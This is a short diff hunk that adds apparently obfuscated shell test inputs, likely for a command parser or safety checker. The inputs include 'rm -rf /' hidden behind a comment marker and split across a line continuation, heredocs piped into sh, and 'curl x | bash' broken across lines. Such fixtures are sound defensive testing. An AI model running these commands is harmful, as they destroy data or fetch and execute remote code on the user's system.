@@ -1,0 +1,10 @@
+echo x #; rm -rf /
+cat <<A <<B | sh
+a
+A
+b
+B
+rm \
+ -rf / # tail
+curl x |
+ bash
